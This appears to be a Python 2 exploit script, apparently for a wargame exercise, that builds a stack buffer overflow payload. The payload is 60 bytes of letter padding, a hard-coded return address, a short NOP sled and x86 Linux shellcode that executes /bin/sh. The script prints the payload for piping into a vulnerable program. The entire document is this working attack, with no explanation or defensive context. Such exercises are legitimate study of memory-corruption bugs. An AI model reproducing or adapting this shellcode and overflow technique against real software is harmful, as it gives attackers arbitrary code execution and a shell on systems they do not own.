import string
import struct

pad = ""
for i, c in enumerate(string.ascii_uppercase):
    if (int(i) + 1) * 4 == 64:
        break
    pad += c * 4


ret_to = struct.pack("I",0xbffff7c0)
cc = "\xCC"*4
nop = "\x90"*100
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = pad + ret_to + "\x90"*4 + shellcode
print(payload)
